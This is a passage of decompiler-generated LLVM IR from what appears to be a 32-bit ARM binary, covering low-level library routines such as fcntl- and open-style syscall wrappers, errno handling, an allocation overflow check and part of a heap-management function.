  uselistorder i32 (i32)* @function_12f30, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32* @global_var_22300.547, { 1, 0 }
  uselistorder i32 168, { 2, 0, 1 }
  uselistorder i8 47, { 0, 5, 6, 1, 2, 3, 4, 7, 8, 9, 10 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12ea4, { 1, 0 }
  uselistorder label %bb63, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12e28, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_12dc8, { 1, 0 }
  uselistorder label %dec_label_pc_12d74, { 1, 0 }
  uselistorder label %.thread38, { 1, 0 }
  uselistorder label %dec_label_pc_12d5c, { 1, 0 }
}

define i32 @function_12f18() local_unnamed_addr {
dec_label_pc_12f18:
  %v0_12f1c = call i32 @function_15dac()
  %v1_12f20 = add i32 %v0_12f1c, -164
  ret i32 %v1_12f20
}

define i32 @function_12f2c() local_unnamed_addr {
dec_label_pc_12f2c:
  %v1_12f2c = load i32, i32* @r0, align 4
  ret i32 %v1_12f2c
}

define i32 @function_12f30(i32 %arg1) local_unnamed_addr {
dec_label_pc_12f30:
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg1, i32* %r6.global-to-local, align 4
  %v1_12f3c = call i32 @function_12f2c()
  store i32 %v1_12f3c, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_22304.549 to i32), i32* %r5.global-to-local, align 4
  br i1 and (i1 icmp ule (i32 ptrtoint (i32* @global_var_22304.549 to i32), i32 140040), i1 icmp ne (i32 ptrtoint (i32* @global_var_22304.549 to i32), i32 140040)), label %dec_label_pc_12f4c, label %dec_label_pc_12f60

dec_label_pc_12f4c:                               ; preds = %dec_label_pc_12f30, %dec_label_pc_12f4c
  %v0_12f4c3 = phi i32 [ %v1_12f4c, %dec_label_pc_12f4c ], [ 140040, %dec_label_pc_12f30 ]
  %v1_12f4c = add i32 %v0_12f4c3, -4
  %v2_12f4c = inttoptr i32 %v1_12f4c to i32*
  %v3_12f4c = load i32, i32* %v2_12f4c, align 4
  call void @__pseudo_branch(i32 %v3_12f4c)
  %v1_12f58.pre = load i32, i32* %r5.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_12f4c, %v1_12f58.pre
  br i1 %tmp, label %dec_label_pc_12f4c, label %dec_label_pc_12f60

dec_label_pc_12f60:                               ; preds = %dec_label_pc_12f4c, %dec_label_pc_12f30
  store i32 77676, i32* @lr, align 4
  %v1_12f68 = call i32 @function_19778()
  store i32 %v1_12f68, i32* @r0, align 4
  %v1_12f74 = call i32 @function_17274()
  %v0_12f78 = load i32, i32* %r6.global-to-local, align 4
  %v1_12f7c = call i32 @function_15f8c(i32 %v0_12f78)
  ret i32 %v1_12f7c

; uselistorder directives
  uselistorder i32 %v1_12f4c, { 0, 2, 1 }
  uselistorder i32 140040, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_12f4c, { 1, 0 }
}

define i32 @function_12f94(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_12f94:
  store i32 %arg4, i32* @r3, align 4
  store i32 %arg4, i32* @r2, align 4
  ret i32 %arg2
}

define i32 @function_12fb4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12fb4:
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %v3_12fb8 = load i32, i32* @r4, align 4
  %v15_12fb8 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v7_12fc8 = icmp eq i32 %arg2, 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  br i1 %v7_12fc8, label %bb, label %dec_label_pc_12fe0

bb:                                               ; preds = %dec_label_pc_12fb4
  %v2_12fd8 = or i32 %arg3, 131072
  store i32 %v2_12fd8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13100

dec_label_pc_12fe0:                               ; preds = %dec_label_pc_12fb4
  %v7_12fe0 = icmp eq i32 %arg2, 14
  br i1 %v7_12fe0, label %dec_label_pc_12fe8, label %dec_label_pc_13010

dec_label_pc_12fe8:                               ; preds = %dec_label_pc_12fe0
  store i32 14, i32* @r2, align 4
  store i32 %arg3, i32* @r3, align 4
  %v3_13008 = call i32 @function_157a0(i32 221, i32 %arg1, i32 14)
  store i32 %v3_13008, i32* @r0, align 4
  br label %dec_label_pc_13114

dec_label_pc_13010:                               ; preds = %dec_label_pc_12fe0
  %v7_13010 = icmp eq i32 %arg2, 9
  br i1 %v7_13010, label %dec_label_pc_13018, label %dec_label_pc_13068

dec_label_pc_13018:                               ; preds = %dec_label_pc_13010
  %v2_13024 = ptrtoint i32* %stack_var_-44 to i32
  %v4_13028 = call i32 @function_12f94(i32 221, i32 %arg1, i32 16, i32 %v2_13024)
  store i32 %v4_13028, i32* @r0, align 4
  %v4_13030 = icmp eq i32 %v4_13028, -22
  br i1 %v4_13030, label %dec_label_pc_13034, label %dec_label_pc_1304c

dec_label_pc_13034:                               ; preds = %dec_label_pc_13018
  %v0_13034 = load i32, i32* %r7.global-to-local, align 4
  %v0_13038 = load i32, i32* %r6.global-to-local, align 4
  %v0_1303c = load i32, i32* %r5.global-to-local, align 4
  %v4_13044 = call i32 @function_12f94(i32 221, i32 %v0_13034, i32 %v0_13038, i32 %v0_1303c)
  br label %dec_label_pc_13118

dec_label_pc_1304c:                               ; preds = %dec_label_pc_13018
  %v2_1304c = icmp eq i32 %v4_13028, 0
  br i1 %v2_1304c, label %dec_label_pc_13054, label %dec_label_pc_13114

dec_label_pc_13054:                               ; preds = %dec_label_pc_1304c
  %v3_13054 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_13054, i32* @r3, align 4
  %v7_1305c = icmp eq i32 %v3_13054, 2
  br i1 %v7_1305c, label %bb21, label %dec_label_pc_13118

bb21:                                             ; preds = %dec_label_pc_13054
  %v2_13060 = sub i32 0, %tmp
  br label %dec_label_pc_13118

dec_label_pc_13068:                               ; preds = %dec_label_pc_13010
  %v9_1306c = icmp eq i32 %arg2, 1030
  br i1 %v9_1306c, label %dec_label_pc_13074, label %dec_label_pc_13100

dec_label_pc_13074:                               ; preds = %dec_label_pc_13068
  %v4_13084 = call i32 @function_12f94(i32 221, i32 %arg1, i32 1030, i32 %arg3)
  %v7_13088 = icmp eq i32 %v4_13084, -22
  store i32 %v4_13084, i32* @r4, align 4
  br i1 %v7_13088, label %dec_label_pc_1309c, label %dec_label_pc_130e4

dec_label_pc_1309c:                               ; preds = %dec_label_pc_13074
  %v0_1309c = load i32, i32* %r6.global-to-local, align 4
  %v0_130a4 = load i32, i32* %r7.global-to-local, align 4
  %v4_130ac = call i32 @function_12f94(i32 221, i32 %v0_130a4, i32 %v0_1309c, i32 0)
  %v7_130b0 = icmp eq i32 %v4_130ac, -22
  br i1 %v7_130b0, label %dec_label_pc_130cc, label %dec_label_pc_130b8

dec_label_pc_130b8:                               ; preds = %dec_label_pc_1309c
  %v1_130b8 = icmp slt i32 %v4_130ac, 0
  br i1 %v1_130b8, label %dec_label_pc_130f8, label %dec_label_pc_130c0

dec_label_pc_130c0:                               ; preds = %dec_label_pc_130b8
  store i32 6, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_130f8

dec_label_pc_130cc:                               ; preds = %dec_label_pc_1309c
  %v0_130cc = load i32, i32* %r7.global-to-local, align 4
  %v0_130d0 = load i32, i32* %r5.global-to-local, align 4
  %v4_130dc = call i32 @function_12f94(i32 221, i32 %v0_130cc, i32 0, i32 %v0_130d0)
  store i32 %v4_130dc, i32* @r4, align 4
  br label %dec_label_pc_130e4

dec_label_pc_130e4:                               ; preds = %dec_label_pc_13074, %dec_label_pc_130cc
  %v3_130e8 = phi i32 [ %v4_130dc, %dec_label_pc_130cc ], [ %v4_13084, %dec_label_pc_13074 ]
  %storemerge1 = icmp slt i32 %v3_130e8, 0
  br i1 %storemerge1, label %.thread6, label %bb23

bb23:                                             ; preds = %dec_label_pc_130e4
  store i32 2, i32* @r2, align 4
  store i32 1, i32* @r3, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_130e4, %bb23
  %v3_130f4 = xor i1 %storemerge1, true
  call void @__pseudo_cond_branch(i1 %v3_130f4, i32 ptrtoint (i32* @global_var_12f94.557 to i32))
  br label %dec_label_pc_130f8

dec_label_pc_130f8:                               ; preds = %dec_label_pc_130b8, %dec_label_pc_130c0, %.thread6
  %v0_130f8 = load i32, i32* @r4, align 4
  store i32 %v0_130f8, i32* @r0, align 4
  br label %dec_label_pc_13114

dec_label_pc_13100:                               ; preds = %bb, %dec_label_pc_13068
  %v0_13108 = phi i32 [ %arg3, %dec_label_pc_13068 ], [ %v2_12fd8, %bb ]
  %v4_13110 = call i32 @function_12f94(i32 221, i32 %arg1, i32 %arg2, i32 %v0_13108)
  store i32 %v4_13110, i32* @r0, align 4
  br label %dec_label_pc_13114

dec_label_pc_13114:                               ; preds = %dec_label_pc_1304c, %dec_label_pc_130f8, %dec_label_pc_12fe8, %dec_label_pc_13100
  %v0_13114 = call i32 @function_131c4()
  br label %dec_label_pc_13118

dec_label_pc_13118:                               ; preds = %bb21, %dec_label_pc_13054, %dec_label_pc_13034, %dec_label_pc_13114
  %v1_13124 = phi i32 [ %v2_13060, %bb21 ], [ %tmp, %dec_label_pc_13054 ], [ %v4_13044, %dec_label_pc_13034 ], [ %v0_13114, %dec_label_pc_13114 ]
  store i32 %v3_12fb8, i32* @r4, align 4
  store i32 %v15_12fb8, i32* @lr, align 4
  ret i32 %v1_13124

; uselistorder directives
  uselistorder i32 %v4_130ac, { 1, 0 }
  uselistorder i32 %v4_13084, { 1, 2, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32 (i32, i32, i32, i32)* @function_12f94, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3, 4 }
  uselistorder i32 %arg2, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %arg1, { 0, 2, 1, 3, 4 }
  uselistorder label %dec_label_pc_13118, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_13114, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_13100, { 1, 0 }
  uselistorder label %dec_label_pc_130f8, { 2, 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_130e4, { 1, 0 }
}

define i32 @function_1312c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1312c:
  %r7.global-to-local = alloca i32, align 4
  %v6_1312c = load i32, i32* @r2, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  %v1_1313c = and i32 %arg2, 64
  %v2_1313c = icmp eq i32 %v1_1313c, 0
  br i1 %v2_1313c, label %dec_label_pc_13144, label %dec_label_pc_1315c

dec_label_pc_13144:                               ; preds = %dec_label_pc_1312c
  %v2_1314c = and i32 %arg2, 4210688
  %v3_13150 = icmp eq i32 %v2_1314c, 4210688
  br i1 %v3_13150, label %dec_label_pc_1315c, label %dec_label_pc_13168

dec_label_pc_1315c:                               ; preds = %dec_label_pc_13144, %dec_label_pc_1312c
  br label %dec_label_pc_13168

dec_label_pc_13168:                               ; preds = %dec_label_pc_13144, %dec_label_pc_1315c
  %storemerge = phi i32 [ %v6_1312c, %dec_label_pc_1315c ], [ 0, %dec_label_pc_13144 ]
  store i32 %storemerge, i32* @r3, align 4
  %v1_13170 = or i32 %arg2, 131072
  store i32 %v1_13170, i32* @r2, align 4
  %v3_13184 = call i32 @function_157a0(i32 5, i32 %arg1, i32 %v1_13170)
  %v1_13188 = icmp slt i32 %v3_13184, 0
  br i1 %v1_13188, label %dec_label_pc_131a8, label %dec_label_pc_13190

dec_label_pc_13190:                               ; preds = %dec_label_pc_13168
  %v0_13190 = load i32, i32* %r7.global-to-local, align 4
  %v1_13190 = and i32 %v0_13190, 524288
  %v2_13190 = icmp eq i32 %v1_13190, 0
  br i1 %v2_13190, label %dec_label_pc_131a8, label %dec_label_pc_13198

dec_label_pc_13198:                               ; preds = %dec_label_pc_13190
  store i32 221, i32* %r7.global-to-local, align 4
  store i32 1, i32* @r2, align 4
  br label %dec_label_pc_131a8

dec_label_pc_131a8:                               ; preds = %dec_label_pc_13198, %dec_label_pc_13190, %dec_label_pc_13168
  store i32 %v3_13184, i32* @r0, align 4
  %v0_131ac = call i32 @function_131c4()
  ret i32 %v0_131ac

; uselistorder directives
  uselistorder i32 221, { 7, 3, 4, 2, 1, 5, 0, 6 }
  uselistorder i32 64, { 10, 28, 3, 4, 11, 5, 12, 13, 6, 14, 7, 15, 16, 8, 17, 18, 9, 19, 20, 0, 21, 23, 22, 1, 24, 26, 25, 2, 27 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_13168, { 1, 0 }
}

define i32 @function_131c4() local_unnamed_addr {
dec_label_pc_131c4:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_131c4 = load i32, i32* @r0, align 4
  %v2_131c4 = icmp ugt i32 %v0_131c4, -4097
  %v7_131c4 = icmp eq i32 %v0_131c4, -4096
  %v3_131c8 = load i32, i32* @r4, align 4
  store i32 %v3_131c8, i32* %stack_var_-8, align 4
  %v2_131cc = xor i1 %v2_131c4, true
  %v3_131cc = or i1 %v7_131c4, %v2_131cc
  br i1 %v3_131cc, label %bb, label %bb4

bb:                                               ; preds = %dec_label_pc_131c4
  store i32 %v0_131c4, i32* @r2, align 4
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_131c4, %bb
  store i32 %v0_131c4, i32* %r4.global-to-local, align 4
  %v2_131d4 = xor i1 %v7_131c4, true
  %v3_131d4 = and i1 %v2_131c4, %v2_131d4
  br i1 %v3_131d4, label %dec_label_pc_131e4, label %dec_label_pc_131d8

dec_label_pc_131d8:                               ; preds = %bb4, %dec_label_pc_131e4
  %v2_131dc = phi i32 [ %v3_131c8, %bb4 ], [ %v2_131dc.pre, %dec_label_pc_131e4 ]
  %v0_131d8 = load i32, i32* @r2, align 4
  store i32 %v2_131dc, i32* @r4, align 4
  ret i32 %v0_131d8

dec_label_pc_131e4:                               ; preds = %bb4
  %v0_131e4 = call i32 @function_12f18()
  %v0_131e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_131e8 = sub i32 0, %v0_131e8
  store i32 %v1_131e8, i32* @r3, align 4
  store i32 -1, i32* @r2, align 4
  %v2_131f0 = inttoptr i32 %v0_131e4 to i32*
  store i32 %v1_131e8, i32* %v2_131f0, align 4
  %v2_131dc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_131d8

; uselistorder directives
  uselistorder i1 %v7_131c4, { 1, 0 }
  uselistorder i1 %v2_131c4, { 1, 0 }
  uselistorder i32 %v0_131c4, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_131d8, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_131f8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13218.dec_label_pc_13218_crit_edge.lr.ph:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-12, align 4
  %v3_131fc = load i32, i32* @r4, align 4
  %v2_13204 = ptrtoint i32* %stack_var_-12 to i32
  %v2_13214 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_13214, i32* %ip.global-to-local, align 4
  %v4_1321820 = add i32 %v2_13204, 4
  store i32 %v4_1321820, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-52, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13218.dec_label_pc_13218_crit_edge

dec_label_pc_13218.dec_label_pc_13218_crit_edge:  ; preds = %dec_label_pc_13218.dec_label_pc_13218_crit_edge.dec_label_pc_13218.dec_label_pc_13218_crit_edge_crit_edge, %dec_label_pc_13218.dec_label_pc_13218_crit_edge.lr.ph
  %v2_1321c.pre = phi i32 [ %v2_13214, %dec_label_pc_13218.dec_label_pc_13218_crit_edge.lr.ph ], [ %v2_1321c.pre.pre, %dec_label_pc_13218.dec_label_pc_13218_crit_edge.dec_label_pc_13218.dec_label_pc_13218_crit_edge_crit_edge ]
  %v0_13218.pre = phi i32 [ %v4_1321820, %dec_label_pc_13218.dec_label_pc_13218_crit_edge.lr.ph ], [ %v0_13218.pre.pre, %dec_label_pc_13218.dec_label_pc_13218_crit_edge.dec_label_pc_13218.dec_label_pc_13218_crit_edge_crit_edge ]
  %v1_1322025 = phi i32 [ 4, %dec_label_pc_13218.dec_label_pc_13218_crit_edge.lr.ph ], [ %v1_13220, %dec_label_pc_13218.dec_label_pc_13218_crit_edge.dec_label_pc_13218.dec_label_pc_13218_crit_edge_crit_edge ]
  %v1_13218 = inttoptr i32 %v0_13218.pre to i32*
  %v2_13218 = load i32, i32* %v1_13218, align 4
  %v4_13218 = add i32 %v0_13218.pre, 4
  store i32 %v4_13218, i32* %r0.global-to-local, align 4
  %v3_1321c = add i32 %v1_1322025, %v2_1321c.pre
  %v4_1321c = inttoptr i32 %v3_1321c to i32*
  store i32 %v2_13218, i32* %v4_1321c, align 4
  %v0_13220 = load i32, i32* %r2.global-to-local, align 4
  %v1_13220 = add i32 %v0_13220, 4
  store i32 %v1_13220, i32* %r2.global-to-local, align 4
  %v7_13224 = icmp eq i32 %v1_13220, 16
  br i1 %v7_13224, label %dec_label_pc_1322c, label %dec_label_pc_13218.dec_label_pc_13218_crit_edge.dec_label_pc_13218.dec_label_pc_13218_crit_edge_crit_edge

dec_label_pc_13218.dec_label_pc_13218_crit_edge.dec_label_pc_13218.dec_label_pc_13218_crit_edge_crit_edge: ; preds = %dec_label_pc_13218.dec_label_pc_13218_crit_edge
  %v0_13218.pre.pre = load i32, i32* %r0.global-to-local, align 4
  %v2_1321c.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13218.dec_label_pc_13218_crit_edge

dec_label_pc_1322c:                               ; preds = %dec_label_pc_13218.dec_label_pc_13218_crit_edge
  store i32 %arg1, i32* @r0, align 4
  %v0_13244 = call i32 @function_131c4()
  store i32 %v0_13244, i32* %r0.global-to-local, align 4
  store i32 %v3_131fc, i32* @r4, align 4
  ret i32 %v0_13244

; uselistorder directives
  uselistorder i32 %v1_13220, { 1, 2, 0 }
  uselistorder i32 %v0_13218.pre, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 4, 0 }
}

define i32 @function_13258(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13258:
  store i32 %arg2, i32* @r1, align 4
  %v3_13258 = load i32, i32* @r4, align 4
  %v6_13258 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  %v2_1325c = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r4, align 4
  br i1 %v2_1325c, label %dec_label_pc_1327c, label %dec_label_pc_1326c

dec_label_pc_1326c:                               ; preds = %dec_label_pc_13258
  store i32 -1, i32* @r0, align 4
  %v0_13270 = call i32 @function_1296c()
  %v1_13274 = load i32, i32* @r4, align 4
  %v3_13274 = icmp ult i32 %v0_13270, %v1_13274
  br i1 %v3_13274, label %dec_label_pc_13298, label %dec_label_pc_1326c.dec_label_pc_1327c_crit_edge

dec_label_pc_1326c.dec_label_pc_1327c_crit_edge:  ; preds = %dec_label_pc_1326c
  %v1_1327c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1327c

dec_label_pc_1327c:                               ; preds = %dec_label_pc_1326c.dec_label_pc_1327c_crit_edge, %dec_label_pc_13258
  %v1_1327c = phi i32 [ %v1_1327c.pre, %dec_label_pc_1326c.dec_label_pc_1327c_crit_edge ], [ 0, %dec_label_pc_13258 ]
  %v0_1327c = phi i32 [ %v1_13274, %dec_label_pc_1326c.dec_label_pc_1327c_crit_edge ], [ %arg1, %dec_label_pc_13258 ]
  %v2_1327c = mul i32 %v0_1327c, %v1_1327c
  %v1_13280 = call i32 @function_143c0(i32 %v2_1327c)
  store i32 %v1_13280, i32* @r2, align 4
  br label %dec_label_pc_13288

dec_label_pc_13288:                               ; preds = %dec_label_pc_13298, %dec_label_pc_1327c
  %v0_13288 = phi i32 [ %v0_13288.pre, %dec_label_pc_13298 ], [ %v1_13280, %dec_label_pc_1327c ]
  store i32 %v3_13258, i32* @r4, align 4
  store i32 %v6_13258, i32* @r5, align 4
  ret i32 %v0_13288

dec_label_pc_13298:                               ; preds = %dec_label_pc_1326c
  %v0_13298 = call i32 @function_12f18()
  store i32 0, i32* @r2, align 4
  %v2_132a4 = inttoptr i32 %v0_13298 to i32*
  store i32 12, i32* %v2_132a4, align 4
  %v0_13288.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_13288
}

define i32 @function_132ac(i32* %arg1) local_unnamed_addr {
dec_label_pc_132ac:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %v3_132ac = load i32, i32* @r4, align 4
  store i32 %v3_132ac, i32* %stack_var_-36, align 4
  %v6_132ac = load i32, i32* @r5, align 4
  %v9_132ac = load i32, i32* @r6, align 4
  %v12_132ac = load i32, i32* @r7, align 4
  %v15_132ac = load i32, i32* @r8, align 4
  %v21_132ac = load i32, i32* @sl, align 4
  %v2_132b0 = load i32, i32* %arg1, align 4
  store i32 %v2_132b0, i32* @sl, align 4
  %v1_132b4 = urem i32 %v2_132b0, 2
  %v2_132b4 = icmp eq i32 %v1_132b4, 0
  store i32 %tmp, i32* %fp.global-to-local, align 4
  br i1 %v2_132b4, label %dec_label_pc_132c4, label %dec_label_pc_133a0

dec_label_pc_132c4:                               ; preds = %dec_label_pc_132ac, %dec_label_pc_13394
  %v0_132c4 = phi i32 [ %v0_13394, %dec_label_pc_13394 ], [ %v2_132b0, %dec_label_pc_132ac ]
  %v3_132c4 = udiv i32 %v0_132c4, 16
  store i32 %v3_132c4, i32* %r3.global-to-local, align 4
  %v1_132c8 = add nsw i32 %v3_132c4, -1
  store i32 %v1_132c8, i32* @r0, align 4
  %tmp39 = icmp ult i32 %v1_132c8, 33
  br i1 %tmp39, label %.thread, label %dec_label_pc_132d8

.thread:                                          ; preds = %dec_label_pc_132c4
  store i32 %v1_132c8, i32* @r8, align 4
  br label %dec_label_pc_132f0

dec_label_pc_132d8:                               ; preds = %dec_label_pc_132c4
  %tmp40 = icmp ugt i32 %v1_132c8, 7168
  br i1 %tmp40, label %.thread18, label %dec_label_pc_132e4

.thread18:                                        ; preds = %dec_label_pc_132d8
  store i32 63, i32* @r8, align 4
  br label %dec_label_pc_132f0

dec_label_pc_132e4:                               ; preds = %dec_label_pc_132d8
  %v0_132e4 = call i32 @function_175bc()
  %v3_132e8 = udiv i32 %v0_132e4, 2097152
  %v1_132ec = add nsw i32 %v3_132e8, -496
  store i32 %v1_132ec, i32* @r8, align 4
  br label %dec_label_pc_132f0

dec_label_pc_132f0:                               ; preds = %.thread18, %.thread, %dec_label_pc_132e4
  %v0_132f8 = phi i32 [ 63, %.thread18 ], [ %v1_132c8, %.thread ], [ %v1_132ec, %dec_label_pc_132e4 ]
  %v3_132f4 = load i32, i32* @global_var_22b38.560, align 4
  store i32 %v3_132f4, i32* %r2.global-to-local, align 4
  %v3_132f8 = mul i32 %v0_132f8, 16
  store i32 %v3_132f8, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_22408.562 to i32), i32* %sb.global-to-local, align 4
  %v2_13300 = icmp eq i32 %v3_132f4, 0
  store i1 %v2_13300, i1* @cpsr_z, align 1
  %v1_13304 = or i32 %v3_132f8, 8
  store i32 %v1_13304, i32* %r3.global-to-local, align 4
  %v2_13308 = add i32 %v1_13304, ptrtoint (i32* @global_var_22408.562 to i32)
  store i32 %v2_13308, i32* @r6, align 4
  br i1 %v2_13300, label %bb, label %dec_label_pc_133d0

bb:                                               ; preds = %dec_label_pc_132f0
  %v1_1330c = load i32, i32* @sl, align 4
  store i32 %v1_1330c, i32* @r0, align 4
  br label %dec_label_pc_13314

dec_label_pc_13314:                               ; preds = %bb, %dec_label_pc_1340c
  %v0_1333838 = phi i32 [ %v1_1330c, %bb ], [ %v2_1340c, %dec_label_pc_1340c ]
  %v0_13318 = phi i32 [ ptrtoint (i32* @global_var_22408.562 to i32), %bb ], [ %v0_13318.pre, %dec_label_pc_1340c ]
  %v0_13314 = phi i32 [ %v0_132f8, %bb ], [ %v0_13314.pre, %dec_label_pc_1340c ]
  %v1_13314 = add i32 %v0_13314, 1
  store i32 %v1_13314, i32* %r1.global-to-local, align 4
  %v4_13318 = mul i32 %v1_13314, 16
  %v5_13318 = add i32 %v4_13318, %v0_13318
  %v6_13318 = inttoptr i32 %v5_13318 to i32*
  %v7_13318 = load i32, i32* %v6_13318, align 4
  store i32 %v7_13318, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22408.562 to i32), i32* @r6, align 4
  %v2_13320 = icmp eq i32 %v7_13318, 0
  br i1 %v2_13320, label %bb31, label %.thread4

bb31:                                             ; preds = %dec_label_pc_13314
  %v4_13324 = mul i32 %v1_13314, 16
  %v3_13328 = add i32 %v4_13324, ptrtoint (i32* @global_var_22408.562 to i32)
  store i32 %v3_13328, i32* %r3.global-to-local, align 4
  %v2_1332c = add i32 %v4_13324, add (i32 ptrtoint (i32* @global_var_22408.562 to i32), i32 -8)
  store i32 %v2_1332c, i32* %r2.global-to-local, align 4
  %v7_13330 = add i32 %v4_13318, ptrtoint (i32* @global_var_22408.562 to i32)
  %v8_13330 = inttoptr i32 %v7_13330 to i32*
  store i32 %v2_1332c, i32* %v8_13330, align 4
  %v1_13334 = load i32, i32* %r2.global-to-local, align 4
  %v2_13334 = load i32, i32* %r3.global-to-local, align 4
  %v3_13334 = add i32 %v2_13334, 4
  %v4_13334 = inttoptr i32 %v3_13334 to i32*
  store i32 %v1_13334, i32* %v4_13334, align 4
  %v0_13338.pre = load i32, i32* @r0, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_13314, %bb31
  %v0_13338 = phi i32 [ %v0_1333838, %dec_label_pc_13314 ], [ %v0_13338.pre, %bb31 ]
  %v1_13338 = load i32, i32* @sl, align 4
  %v9_13338 = icmp eq i32 %v0_13338, %v1_13338
  br i1 %v9_13338, label %dec_label_pc_13414, label %dec_label_pc_13340

dec_label_pc_13340:                               ; preds = %.thread4
  %v0_13340 = load i32, i32* @r5, align 4
  %v1_13340 = add i32 %v0_13340, 8
  store i32 %v1_13340, i32* %r2.global-to-local, align 4
  %v1_13344 = load i32, i32* @r6, align 4
  %v2_13344 = add i32 %v1_13344, %v1_13340
  %v3_13344 = inttoptr i32 %v2_13344 to i32*
  %v4_13344 = load i32, i32* %v3_13344, align 4
  store i32 %v4_13344, i32* %r3.global-to-local, align 4
  %v2_13348 = icmp eq i32 %v4_13344, 0
  store i1 %v2_13348, i1* @cpsr_z, align 1
  store i32 %v2_13344, i32* %r4.global-to-local, align 4
  br i1 %v2_13348, label %dec_label_pc_13394, label %dec_label_pc_13354

dec_label_pc_13354:                               ; preds = %dec_label_pc_13340
  %v0_13354 = call i32 @function_15ce4()
  store i32 %v0_13354, i32* @r0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1335c = load i32, i32* %r2.global-to-local, align 4
  %v2_1335c = load i32, i32* @r6, align 4
  %v3_1335c = add i32 %v2_1335c, %v1_1335c
  %v4_1335c = inttoptr i32 %v3_1335c to i32*
  store i32 0, i32* %v4_1335c, align 4
  %v0_13360 = call i32 @function_15ce4()
  %v0_13364 = load i32, i32* @r5, align 4
  %v1_13364 = add i32 %v0_13364, 12
  store i32 %v1_13364, i32* %r3.global-to-local, align 4
  %v1_13368 = load i32, i32* @r6, align 4
  %v2_13368 = add i32 %v1_13368, %v1_13364
  %v3_13368 = inttoptr i32 %v2_13368 to i32*
  %v4_13368 = load i32, i32* %v3_13368, align 4
  store i32 %v4_13368, i32* %r2.global-to-local, align 4
  %v2_1336c = icmp eq i32 %v4_13368, 0
  br i1 %v2_1336c, label %dec_label_pc_13390, label %dec_label_pc_13374

dec_label_pc_13374:                               ; preds = %dec_label_pc_13354
  store i32 240, i32* %r7.global-to-local, align 4
  %v0_13378 = load i32, i32* %r4.global-to-local, align 4
  store i32 129, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v7_13388 = icmp eq i32 %v0_13378, -38
  br i1 %v7_13388, label %dec_label_pc_133f8, label %dec_label_pc_13390

dec_label_pc_13390:                               ; preds = %dec_label_pc_13374, %dec_label_pc_13354
  %v0_13390 = load i32, i32* %fp.global-to-local, align 4
  %v1_13390 = inttoptr i32 %v0_13390 to i32*
  %v2_13390 = load i32, i32* %v1_13390, align 4
